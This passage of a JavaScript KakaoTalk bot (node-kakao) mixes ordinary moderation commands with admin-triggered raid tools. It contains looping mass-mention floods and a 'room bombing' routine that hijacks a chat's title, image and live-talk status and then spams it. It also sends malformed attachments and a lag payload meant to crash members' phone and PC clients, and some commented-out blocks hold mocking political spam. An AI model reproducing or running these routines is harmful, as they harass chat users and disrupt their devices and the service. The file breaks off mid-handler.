// 낚시 투표


//channel.getUserInfo({ userId: id}).nickname

//아이디로 닉네임

// 1484줄부터 내가 추가한거
// 5373


"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
const { loadImage, registerFont, createCanvas, Image } = require('canvas');
registerFont('./bot/font.otf', { family: 'DungGeunMo' });
var fs = require('fs');
function _typeof(obj) { if (typeof Symbol === "function" && typeof Symbol.iterator === "symbol") { _typeof = function _typeof(obj) { return typeof obj; }; } else { _typeof = function _typeof(obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; }; } return _typeof(obj); };
const is = require('is_js');
const node_kakao = require("node-kakao");
const node_kakaolink = require("node-kakaolink");
const readline = require('readline');
const crypto = __importDefault(require("crypto"));
const request = require('request');
const cheerio = require('cheerio');
const express = require('express');
const { Long } = require('bson');
const http = require('http');
const ipinfo = require('ipinfo');
const ytdl = require('ytdl-core');
//const fetch = __importDefault('node-fetch');
let app = express();
app.set('trust proxy', true);
const getDnsIp = require("ip");
const { kMaxLength } = require('buffer');
const { channel } = require('diagnostics_channel');
const { date } = require('is_js');
const { Webhook, MessageBuilder } = require('discord-webhook-node');
const axios = require('axios');
const googleTTS = require('google-tts-api');
let getInfo;
try {
    getInfo = fs.readFileSync('./info.json', 'utf8');
} catch (e) {
    console.log(e);
};
getInfo = JSON.parse(getInfo);
let { email, pw, deviceName, deviceUUID, prefix, autoAdmin, openVerify, useCustomCode, openCustomCode, banKey, ipPort, dikoHook, subwayAPI } = getInfo;
ipPort *= 1;
let ipLog_local;
let ipLog_admin = getDnsIp.address();
let ipLog_channel;
let ipLog_loggedIps = [];
let ipLog_filter = true;
let ipLog_usingServer = "None";
let ipLog_adress = "";
let adminList = [];
const hook = new Webhook(dikoHook);
let defConfig = {
    locoBookingHost: 'booking-loco.kakao.com',
    locoBookingPort: 443,
    // eslint-disable-next-line max-len
    locoPEMPublicKey: `-----BEGIN PUBLIC KEY-----\nMIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEApElgRBx+g7sniYFW7LE8ivrwXShKTRFV8lXNItMXbN5QSC8vJ/cTSOTS619Xv5Zx7xXJIk4EKxtWesEGbgZpEUP2xQ+IeH9oz0JxayEMvvD1nVNAWgpWE4pociEoArsK7qY3YwXb1CiDHo9hojLv7djbo3cwXvlyMh4TUrX2RjCZPlVJxk/LVjzcl9ohJLkl3eoSrf0AE4kQ9mk3+raEhq5Dv+IDxKYX+fIytUWKmrQJusjtre9oVUX5sBOYZ0dzez/XapusEhUWImmB6mciVXfRXQ8IK4IH6vfNyxMSOTfLEhRYN2SMLzplAYFiMV536tLS3VmG5GJRdkpDubqPeQIBAw==\n-----END PUBLIC KEY-----`,
    agent: 'win32',
    version: '3.3.8',
    appVersion: '3.3.8.3058',
    osVersion: '10.0',
    // 2 == sub, 1 == main
    deviceType: 2,
    // 0 == wired(WIFI), 3 == cellular
    netType: 0,
    // 999: pc
    mccmnc: '999',
    countryIso: 'KR',
    language: 'ko',
    subDevice: true,
    deviceModel: '',
    loginTokenSeedList: ['PITT', 'INORAN'],
};
let editConfig = {
    locoBookingHost: 'booking-loco.kakao.com',
    locoBookingPort: 443,
    // eslint-disable-next-line max-len
    locoPEMPublicKey: `-----BEGIN PUBLIC KEY-----\nMIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEApElgRBx+g7sniYFW7LE8ivrwXShKTRFV8lXNItMXbN5QSC8vJ/cTSOTS619Xv5Zx7xXJIk4EKxtWesEGbgZpEUP2xQ+IeH9oz0JxayEMvvD1nVNAWgpWE4pociEoArsK7qY3YwXb1CiDHo9hojLv7djbo3cwXvlyMh4TUrX2RjCZPlVJxk/LVjzcl9ohJLkl3eoSrf0AE4kQ9mk3+raEhq5Dv+IDxKYX+fIytUWKmrQJusjtre9oVUX5sBOYZ0dzez/XapusEhUWImmB6mciVXfRXQ8IK4IH6vfNyxMSOTfLEhRYN2SMLzplAYFiMV536tLS3VmG5GJRdkpDubqPeQIBAw==\n-----END PUBLIC KEY-----`,
    agent: 'win32',
    version: '3.3.8',
    appVersion: '3.3.8.3058',
    osVersion: '10.0',
    // 2 == sub, 1 == main
    deviceType: 2,
    // 0 == wired(WIFI), 3 == cellular
    netType: 0,
    // 999: pc
    mccmnc: '999',
    countryIso: 'KR',
    language: 'ko',
    subDevice: true,
    deviceModel: '',
    loginTokenSeedList: ['PITT', 'INORAN'],
};

let blackList = [];


class Bot {
    async startBot(_ACCOUNT) {
        let $ApiClient = node_kakaolink.ApiClient;
        let $KakaoLinkClient = node_kakaolink.KakaoLinkClient;
        let $AuthApiClient = node_kakao.AuthApiClient;
        let $ServiceApiClient = node_kakao.ServiceApiClient;
        let $OAuthApiClient = node_kakao.OAuthApiClient;
        let $ChatBuilder = node_kakao.ChatBuilder;
        let $KnownChatType = node_kakao.KnownChatType;
        let $KnownFeedType = node_kakao.KnownFeedType;
        let $KnownPostItemType = node_kakao.KnownPostItemType;
        let $MentionContent = node_kakao.MentionContent;
        let $ReplyContent = node_kakao.ReplyContent;
        let $ReplyAttachment = node_kakao.ReplyAttachment;
        let $TalkClient = node_kakao.TalkClient;
        let $AttachmentApi = node_kakao.AttachmentApi;
        let $KnownPostFooterStyle = node_kakao.KnownPostFooterStyle;
        let $OpenLinkType = node_kakao.OpenLinkType;
        let $ContactAttachment = node_kakao.ContactAttachment;
        let $AttachmentContent = node_kakao.AttachmentContent;
        let CLIENT = new $TalkClient(editConfig);
        let SessionWebClient;
        let gggg_XVCKEY = "";
        let gggg_TOKEN = "";
        let gggg_R_TOKEN = "";
        let gggg_ID = "";
        let gggg_P_ID = "";
        let gggg_L_RES = "";
        let ver = "10.0.6";
        let kakaoVer = "4.5.1";
        let lastUpdate = "2022.09.04";
        const ACC_EMAIL = _ACCOUNT.split(' ')[0];
        const ACC_PASSWORD = _ACCOUNT.split(' ')[1];
        const ACC_UUID = _ACCOUNT.split(' ')[2];
        const ACC_NAME = _ACCOUNT.split(' ')[3];
        var args;
        var id;
        var roomId;
        let outError = ".";
        let iskeyIssued = false;
        let key;
        let Hider = ["12345678"];
        let bit;
        let boomChannel;
        let logMessage = false; // true;
        let terrorSpam = false;
        let mentionSpam = false;
        let runningSpam = false;
        let comErrSpam = false;
        let phErrSpam = false;
        let titleSpam = false;
        let kakashiSpam = false;
        let runningSpamNo = false;
        let runningMent = false;
        let runningSpamString = false;
        let runningSpamStop = false;
        let mentionInterval;
        let spamInterval;
        let kakashiInterval;
        let stringInterval;
        let stopInterval;
        let terrorInterval;
        let comErrInterval;
        let noInterval;
        let phErrInterval;
        let mentInterval;
        let mustDetect = [];
        let getValueFor;
        let customChat;
        let splitValue;
        let keyWord = "我支持中国共产党。但是毛泽东是残疾的。";
        let keyWordFunction = "我支持中国共产党。但是毛泽东是残疾的。";
        let keyWordData = "我支持中国共产党。但是毛泽东是残疾的。";
        let keyWordDescrip = "설정된 키워드 없음";
        var weatherurl;
        var topAdminMode = false;
        var topAdmin = [83746916922909719, 305751063];
        let verifyList = [];
        let $ChatLog = {};
        let $DefChatLog = {};
        let $TitleSpamList = [];
        let $ProfileSpamList = [];
        const banWord = ["매도", "매입"];

        CLIENT.channelList.open.on('user_join', (joinLog, channel, user, feed) => {
            if (openVerify == "yes") {
                var userDetectChar;
                if (useCustomCode == "yes") {
                    userDetectChar = channel._channel.channelId + ":" + user.userId + ":" + openCustomCode;
                } else {
                    userDetectChar = channel._channel.channelId + ":" + user.userId + ":" + Math.random().toString(10).slice(2, 8);
                };
                channel.sendChat(`[접속] ${user.nickname} (${user.userId}) 님이 채팅방에 접속하였습니다.\n60초 안에 코드 "${userDetectChar.split(':')[2]}" 를 입력해주세요.`);
                verifyList.push(userDetectChar)
                setTimeout(function () {
                    if (verifyList.includes(userDetectChar)) {
                        for (getValueFor = 0; getValueFor < verifyList.length; getValueFor++) {
                            if (verifyList[getValueFor] == userDetectChar) {
                                verifyList.splice(getValueFor);
                            };
                        };
                        try {
                            channel.sendChat("[강퇴] " + user.nickname + "(" + user.userId + ") 님이 60초 안에 코드를 입력하지 않아 강퇴합니다.");
                            channel.kickUser({ userId: user.userId });
                        } catch {
                            channel.sendChat("[강퇴] 사용자를 추방하는데 실패했습니다.");
                        };
                    };
                }, 60000);
            } else if (openVerify == "no") {
                channel.sendChat(`[입장] ${user.nickname} (${user.userId}) 님이 채팅방에 입장하였습니다.`);
            }
        });

        CLIENT.on('chat_read', (chat, channel, reader) => {
            try {
                var detectChar = channel._channel.channelId + ":" + reader.userId;
                if (mustDetect.includes(detectChar)) {
                    for (getValueFor = 0; getValueFor < mustDetect.length; getValueFor++) {
                        if (mustDetect[getValueFor] == detectChar) {
                            mustDetect.splice(getValueFor);
                        };
                    };
                    channel.sendChat("[감지] " + channel.getUserInfo({ userId: reader.userId }).nickname + "(" + reader.userId + ") 님을 감지했습니다!");
                };
            } catch (e) {
                console.log(e + "");
            };
        });

        CLIENT.channelList.normal.on('chat', async (data, channel) => {
            const sender = data.getSenderInfo(channel);
            if (!sender) return;
            args = data.text.split(" ");
            id = data.getSenderInfo(channel).userId;
            roomId = channel._channel.channelId;


            if (!adminList.includes(id + '')) {
                if (blackList.includes(id + '')) {
                    return;
                };
            };


            if (!topAdminMode) {
                /*if (data.text == prefix + "도배 노짱") {
                    if (adminList.includes(id + '')) {
                        if (!runningSpamNo) {
                            runningSpamNo = true;
                            noInterval = setInterval(() => {
                                async function msg() {
                                    await sendErrorPhone()
                                    await delay(110);
                                    var value = Math.floor(Math.random() * 6);
                                    if (value == 0) {
                                        channel.sendChat(
                                            new node_kakao.ChatBuilder()
                                                .append(new node_kakao.AttachmentContent({
                                                    shout: true
                                                }))
                                                .text("야 기분좋다 ㅋ야 기분좋다 ㅋ야 기분좋다 ㅋ야 기분좋다 ㅋ응디 응디 응디 응디 응디 응디 응디 응디 (흔들으라이!)")
                                                .build(1)
                                        )
                                        channel.setNoticeMeta("나도 군대 갔다 왔고, 예비군훈련[2]까지 다 받았는데, 심심하면 사람한테 세금 내라 하고, 불러다가 뺑뺑이 돌리고 훈련시키고 했는데, 거 위에 사람들은 뭐 했어! 작전통제권 자기들 나라 자기 군대 작전 통제도 한 개 제대로 할 수 없는 군대를 맨들어 놔 놓고 나 국방장관이오! 나 참모총장이오! 그렇게 별들 달고 끄드럭(거드럭)거리고 말았다는 얘깁니까? 그래서 작통권 회수하면 안 된다고 줄줄이 모여가 가지고 성명 내고. 자기들이 직무유기 아입니까?")
                                    } else if (value == 1) {
                                        channel.sendChat("노알라 부엉이 코알라 어↗↘... 아니 이 양반아   너 몇살이야 너 ... 애비가 누구야")
                                    } else if (value == 2) {
                                        channel.sendChat(
                                            new node_kakao.ChatBuilder()
                                                .append(new node_kakao.AttachmentContent({
                                                    shout: true
                                                }))
                                                .text("모든 것이 노무현이가 하는거 반대만 하면 정의라 이겁니까?!")
                                                .build(1)
                                        )
                                    } else if (value == 3) {
                                        channel.sendChat(
                                            new node_kakao.ChatBuilder()
                                                .append(new node_kakao.AttachmentContent({
                                                    shout: true
                                                }))
                                                .text("나도 군대 갔다 왔고, 예비군훈련[2]까지 다 받았는데, 심심하면 사람한테 세금 내라 하고, 불러다가 뺑뺑이 돌리고 훈련시키고 했는데, 거 위에 사람들은 뭐 했어! 작전통제권 자기들 나라 자기 군대 작전 통제도 한 개 제대로 할 수 없는 군대를 맨들어 놔 놓고 나 국방장관이오! 나 참모총장이오! 그렇게 별들 달고 끄드럭(거드럭)거리고 말았다는 얘깁니까? 그래서 작통권 회수하면 안 된다고 줄줄이 모여가 가지고 성명 내고. 자기들이 직무유기 아입니까?")
                                                .build(1)
                                        )
                                    } else if (value == 4) {
                                        channel.sendChat(
                                            new node_kakao.ChatBuilder()
                                                .append(new node_kakao.AttachmentContent({
                                                    shout: true
                                                }))
                                                .text("부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! ")
                                                .build(1)
                                        )
                                    } else if (value == 5) {
                                        channel.sendChat(
                                            new node_kakao.ChatBuilder()
                                                .append(new node_kakao.AttachmentContent({
                                                    shout: true
                                                }))
                                                .text("야~딱좋다 기분좋다야~딱좋다 기분좋다야~딱좋다 기분좋다")
                                                .build(1)
                                        )
                                    };
                                };
                                msg();
                            }, 220);
                        } else {
                            channel.sendChat("이미 도배를 하는중입니다!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };*/

                /*if (data.text == prefix + "도배 욕") {
                    if (adminList.includes(id + '')) {
                        if (!runningMent) {
                            runningMent = true;
                            var i = 0;
                            mentInterval = setInterval(() => {
                                var random = Math.floor(Math.random() * mentArray.length);
                                channel.sendChat(mentArray[random]);
                            }, 110);
                        } else {
                            channel.sendChat("이미 도배를 하는중입니다!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };*/

                /*if (data.text == prefix + "도배 랜덤") {
                    if (adminList.includes(id + '')) {
                        if (!runningSpam) {
                            runningSpam = true;
                            var i = 0;
                            spamInterval = setInterval(() => {
                                channel.sendChat(crypto.default.randomBytes(10).toString("base64"));
                            }, 110);
                        } else {
                            channel.sendChat("이미 도배를 하는중입니다!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };*/

                if (data.text == prefix + "도배 멘션") {
                    if (adminList.includes(id + '')) {
                        if (!mentionSpam) {
                            mentionSpam = true;
                            mentionInterval = setInterval(async () => {
                                try {
                                    await mentionAll(channel, 1, 100, 1, false);
                                } catch {

                                };
                            }, 110);
                        } else {
                            channel.sendChat("이미 도배를 하는중입니다!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "모두멘션") {
                    if (adminList.includes(id + '')) {
                        mentionAll(channel, 1, 100, 1, true);
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "투명멘션") {
                    if (adminList.includes(id + '')) {
                        mentionAll(channel, 1, 100, 2, true);
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text.startsWith(prefix + "반복모두멘션")) {
                    if (adminList.includes(id + '')) {
                        if (data.text == prefix + "반복모두멘션") {
                            channel.sendChat("반복할 멘션 횟수를 적어주세요!");
                        } else if (data.text.startsWith(prefix + "반복모두멘션 ")) {
                            var repeatCount = data.text.split(' ')[1];
                            repeatCount *= 1;
                            mentionAll(channel, repeatCount + 1, 100, 1, false);
                        } else {
                            channel.sendChat("올바른 사용법: " + prefix + "반복모두멘션 횟수");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text.startsWith(prefix + "반복투명멘션")) {
                    if (adminList.includes(id + '')) {
                        if (data.text == prefix + "반복투명멘션") {
                            channel.sendChat("반복할 투명멘션 횟수를 적어주세요!");
                        } else if (data.text.startsWith(prefix + "반복투명멘션 ")) {
                            var repeatCount = data.text.split(' ')[1];
                            repeatCount *= 1;
                            mentionAll(channel, repeatCount + 1, 100, 2, false);
                        } else {
                            channel.sendChat("올바른 사용법: " + prefix + "반복투명멘션 횟수");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "단톡렉") {
                    if (adminList.includes(id + '')) {
                        try {
                            channel.sendChat(
                                new $ChatBuilder().append(new $AttachmentContent({
                                    os: lagArray,
                                })).build(24)
                            );
                        } catch (error) {
                            outError = error + "$%^%$";
                            outError = outError.replace("$%^%$", "");
                            channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text.startsWith(prefix + "방제")) {
                    if (data.text == prefix + "방제") {
                        channel.sendChat("올바른 사용방법:\n" + prefix + "방제 방제목");
                    } else if (data.text == prefix + "방제고정") {
                        channel.sendChat("올바른 사용방법:\n" + prefix + "방제고정 방제목");
                    } else if (data.text == prefix + "방제고정해제") {
                        if (adminList.includes(id + '')) {
                            if ($TitleSpamList[roomId] == false) {
                                channel.sendChat("해당 방의 제목 고정 대상이 아닙니다!!");
                            } else {
                                channel.sendChat("해당 방의 제목 고정을 해제합니다!");
                                $TitleSpamList[roomId] = false;
                            };
                        } else {
                            channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                        };
                    } else if (data.text.startsWith(prefix + "방제 ")) {
                        if (adminList.includes(id + '')) {
                            try {
                                channel.setTitleMeta(data.text.replace(prefix + "방제 ", ""));
                                channel.sendChat("방제목을 '" + data.text.replace(prefix + "방제", "") + "' 로 설정했습니다!");
                            } catch (e) {
                                channel.sendChat(e + "");
                            };
                        } else {
                            channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                        };
                    } else if (data.text.startsWith(prefix + "방제고정 ")) {
                        if (adminList.includes(id + '')) {
                            try {
                                var title = data.text.replace(prefix + "방제고정 ", "");
                                $TitleSpamList[roomId] = title;
                                channel.setTitleMeta(title);
                                channel.sendChat("이제부터 해당 방의 제목을 ' " + title + " ' 로 고정합니다!");
                            } catch (e) {
                                channel.sendChat(e + "");
                            };
                        } else {
                            channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                        };
                    } else {
                        channel.sendChat("올바르지 않은 명령어 형식입니다.\n" + prefix + "방제 방제목\n" + prefix + "방제고정 방제목\n" + prefix + "방제고정해제")
                    };
                };

                if (data.text.startsWith(prefix + "방프")) {
                    if (data.text == prefix + "방프") {
                        channel.sendChat("올바른 사용방법:\n" + prefix + "방프 사진링크");
                    } else if (data.text == prefix + "방프고정") {
                        channel.sendChat("올바른 사용방법:\n" + prefix + "방프고정 사진링크");
                    } else if (data.text == prefix + "방프고정해제") {
                        if (adminList.includes(id + '')) {
                            if ($ProfileSpamList[roomId] == false) {
                                channel.sendChat("해당 방의 프사 고정 대상이 아닙니다!!");
                            } else {
                                channel.sendChat("해당 방의 프사 고정을 해제합니다!");
                                $ProfileSpamList[roomId] = false;
                            };
                        } else {
                            channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                        };
                    } else if (data.text.startsWith(prefix + "방프 ")) {
                        if (adminList.includes(id + '')) {
                            try {
                                var _mmm = data.text.replace(prefix + "방프 ", "");
                                channel.setProfileMeta({ imageUrl: _mmm, fullImageUrl: _mmm });
                                channel.sendChat("방프사를 ' " + _mmm + " ' 로 설정하였습니다!");
                            } catch (error) {
                                outError = error + "$%^%$";
                                outError = outError.replace("$%^%$", "");
                                channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
                            };
                        } else {
                            channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                        };
                    } else if (data.text.startsWith(prefix + "방프고정 ")) {
                        if (adminList.includes(id + '')) {
                            try {
                                var profile = data.text.replace(prefix + "방프고정 ", "");
                                $ProfileSpamList[roomId] = profile;
                                channel.setProfileMeta({ imageUrl: profile, fullImageUrl: profile });
                                channel.sendChat("이제부터 해당 방의 프로필사진을 ' " + profile + " ' 로 고정합니다!");
                            } catch (e) {
                                channel.sendChat(e + "");
                            };
                        } else {
                            channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                        };
                    } else {
                        channel.sendChat("올바르지 않은 명령어 형식입니다.\n" + prefix + "방제 방제목\n" + prefix + "방제고정 방제목\n" + prefix + "방제고정해제")
                    };
                };

                if (data.text == prefix + "이보풀자") {
                    if (adminList.includes(id + '')) {
                        if (!kakashiSpam) {
                            kakashiSpam = true;
                            var textArray = [
                                "https://google.com/",
                                "https://naver.com/",
                                "https://mail.tm/",
                                "https://mail.gw/",
                                "https://temp-mail.org/",
                                "https://temp-mail.io/",
                                "https://mail.ru/",
                                "https://ruu.kr/",
                                "https://mega.nz/",
                                "https://gmail.com/",
                                "https://discord.com/",
                                "https://www.youtube.com/"
                            ];
                            var intArray = [
                                662,
                                818,
                                89,
                                510,
                                1083,
                                986
                            ];
                            var ccccount = 0;
                            kakashiInterval = setInterval(() => {
                                ccccount++;
                                var cc = ccccount;
                                (async () => {
                                    var random = Math.floor(Math.random() * textArray.length);
                                    var random2 = Math.floor(Math.random() * intArray.length);
                                    random = textArray[random];
                                    random2 = intArray[random2];
                                    await delay(random2);
                                    channel.sendChat(cc + " | " + random + " | " + ((cc + random2) * 3));
                                })();
                            }, 1953);
                        } else {
                            channel.sendChat("이미 도배를 하는중입니다!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "이보먹자") {
                    if (adminList.includes(id + '')) {
                        if (kakashiSpam) {
                            clearInterval(kakashiInterval);
                            kakashiInterval = null;
                            kakashiSpam = false;
                        } else {
                            channel.sendChat("도배를 진행중이지 않습니다!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text.startsWith(prefix + "공지")) {
                    if (data.text.startsWith(prefix + "공지 ")) {
                        if (adminList.includes(id + '')) {
                            try {
                                var _mmm = data.text.replace(prefix + "공지 ", "");
                                channel.setNoticeMeta(_mmm);
                                channel.sendChat("공지를 ' " + _mmm + " ' 로 설정하였습니다!");
                            } catch (error) {
                                outError = error + "$%^%$";
                                outError = outError.replace("$%^%$", "");
                                channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
                            };
                        } else {
                            channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                        };
                    } else {
                        channel.sendChat("공지 내용을 입력해주세요!");
                    };
                };

                if (data.text.startsWith(prefix + "투표")) {
                    try {
                        if (data.text.includes(prefix + "투표 ")) {
                            sendVote(data.text.replace(prefix + "투표 ", "").split('%')[0], data.text.replace(prefix + "투표 ", "").split('%')[1]);
                        } else {
                            channel.sendChat("투표 옵션을 적어주세요!");
                        };
                    } catch (error) {
                        outError = error + "$%^%$";
                        outError = outError.replace("$%^%$", "");
                        channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
                    };
                };

                if (data.text.startsWith(prefix + "글쓰기")) {
                    if (adminList.includes(id + '')) {
                        sendWord(data.text.replace(prefix + "글쓰기 ", ""));
                    };
                };

                if (data.text == prefix + "방폭청소") {
                    cleanChat(boomChannel, repeatCount, "---채팅청소 종료지점---");
                };

                if (data.text == prefix + "방폭") {
                    if (adminList.includes(id + '')) {
                        (async () => {
                            boomChannel = channel;
                            try { channel.sendChat("방폭을 시작합니다 ^_^"); } catch (e) { };
                            await delay(110);
                            try { await channel.setProfileMeta({ imageUrl: "https://pds.joongang.co.kr/news/component/htmlphoto_mmdata/201701/19/htm_2017011914219153477.jpg", fullImageUrl: "https://pds.joongang.co.kr/news/component/htmlphoto_mmdata/201701/19/htm_2017011914219153477.jpg" }); } catch (e) { };
                            await delay(110);
                            try { await channel.setTitleMeta("내가 점령한 거점 [방폭]"); } catch (e) { };
                            await delay(110);
                            try {
                                await channel.setLiveTalkInfoMeta({
                                    "liveon": true,
                                    "title": "",
                                    "startTime": 1111111111,
                                    "userId": id, //id
                                    "csIP": "211.231.102.213",
                                    "csIP6": "2404:4600:6:369:211:231:102:213",
                                    "csPort": 9000,
                                    "callId": "1111111111111111"
                                });
                            } catch (e) { };
                            await delay(110);
                            try {
                                await channel.setLiveTalkCountMeta({
                                    count: 999
                                });
                            } catch (e) { };
                            await delay(110);
                            try { clearInterval(terrorInterval); } catch (e) { };
                            try { terrorInterval = null; } catch (e) { };
                            try { terrorSpam = false; } catch (e) { };
                            try { terrorSpam = true; } catch (e) { };
                            terrorInterval = setInterval(async () => {
                                try { sendErrorPhone(); } catch (e) { };
                                await delay(110);
                                try { sendErrorCom(channel); } catch (e) { };
                                await delay(110);
                                try {
                                    channel.sendChat(
                                        new $ChatBuilder().append(new $AttachmentContent({
                                            os: lagArray,
                                        })).build(24)
                                    );
                                } catch (e) { };
                                await delay(110);
                                try {
                                    channel.sendChat(
                                        new $ChatBuilder().text(" ").append(new $AttachmentContent({
                                            "name": "(이모티콘)",
                                            "url": "4415897.emot_001.png",
                                            "type": "animated-emoticon/digital-item",
                                            "path2": "2212560.emot_033.png",
                                            "scon": "6002007.file_008.scon",
                                            "s": 0
                                        })).build(22)
                                    );
                                } catch (e) { };
                            }, 440);
                        })();
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "강제오류 폰") {
                    if (adminList.includes(id + '')) {
                        sendErrorPhone();
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "도배 컴튕") {
                    if (adminList.includes(id + '')) {
                        if (!comErrSpam) {
                            comErrSpam = true;
                            comErrInterval = setInterval(() => {
                                sendErrorCom(channel)
                            }, 110);
                        } else {
                            channel.sendChat("이미 도배를 하는중입니다!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "도배 폰튕") {
                    if (adminList.includes(id + '')) {
                        if (!phErrSpam) {
                            phErrSpam = true;
                            phErrInterval = setInterval(() => {
                                sendErrorPhone()
                            }, 110);
                        } else {
                            channel.sendChat("이미 도배를 하는중입니다!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };
            };

            function sendErrorPhone() {
                try {
                    channel.sendChat(
                        new $ChatBuilder()
                            .append(new $AttachmentContent({
                                "os": [
                                    {
                                        "t": 5,
                                        "ct": "강제오류 메세지",
                                        "jct": "[{\"type\":\"text\",\"text\":\"" + "강제오류 메세지" + "\"}]"
                                    },
                                    {
                                        "t": 5,
                                        "st": 5,
                                        "url": ""
                                    }
                                ]
                            }))
                            .build(24)
                    );
                } catch (error) {
                    outError = error + "$%^%$";
                    outError = outError.replace("$%^%$", "");
                    channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
                };
            };

            function sendWord(_text) {
                try {
                    channel.sendChat(
                        new $ChatBuilder()
                            .append(new $AttachmentContent({
                                "os": [
                                    {
                                        "t": 1,
                                        "ct": _text,
                                        "jct": "[{\"type\":\"text\",\"text\":\"" + _text + "\"}]"
                                    },
                                    {
                                        "t": 2,
                                        "st": 1,
                                        "url": ""
                                    }
                                ]
                            }))
                            .build(24)
                    );
                } catch (error) {
                    outError = error + "$%^%$";
                    outError = outError.replace("$%^%$", "");
                    channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
                };
            };

            function sendVote(_text, _text2) {
                try {
                    channel.sendChat(
                        new $ChatBuilder()
                            .append(new $AttachmentContent({
                                "title": _text,
                                "os": [
                                    {
                                        "t": 9,
                                        "st": 1,
                                        "tt": _text,
                                        "its":
                                            [
                                                {
                                                    "tt": _text2
                                                }
                                            ]
                                    },
                                    {
                                        "t": 2,
                                        "st": 4,
                                        "url": ""
                                    }
                                ]
                            }))
                            .build(14)
                    )
                } catch (error) {
                    outError = error + "$%^%$";
                    outError = outError.replace("$%^%$", "");
                    channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
                };
            };
        });

        CLIENT.channelList.open.on('chat', (data, channel) => {
            var sender = data.getSenderInfo(channel);
            if (!sender) return;
            args = data.text.split(" ");
            id = data.getSenderInfo(channel).userId;
            roomId = channel._channel.channelId;
            if (Hider.includes(roomId + ":" + id)) {
                try {
                    channel.hideChat(data._chat);
                } catch (e) {
                    channel.sendChat(e + "");
                };
            };


            if (!adminList.includes(id + '')) {
                if (blackList.includes(id + '')) {
                    return;
                };
            };


            if (!topAdminMode) {
                if (openVerify == "yes") {
                    for (getValueFor = 0; getValueFor < verifyList.length; getValueFor++) {
                        if (verifyList[getValueFor] == roomId + ":" + id + ":" + data.text) {
                            verifyList.splice(getValueFor);
                            channel.sendChat("[인증] 사용자의 인증이 완료되었습니다!");
                        };
                    };
                };

                if (banKey == "yes") {
                    var didYouBan = false;
                    for (getValueFor = 0; getValueFor < banWord.length; getValueFor++) {
                        if (data.text.includes(banWord[getValueFor])) {
                            if (didYouBan == false) {
                                try {
                                    didYouBan = true;
                                    channel.sendChat("[키워드] 금지 키워드가 감지되었습니다.");
                                    channel.kickUser({ userId: id });
                                    channel.hideChat(data._chat);
                                } catch (e) {
                                    channel.sendChat(e + "");
                                };
                            };
                        };
                    };
                };

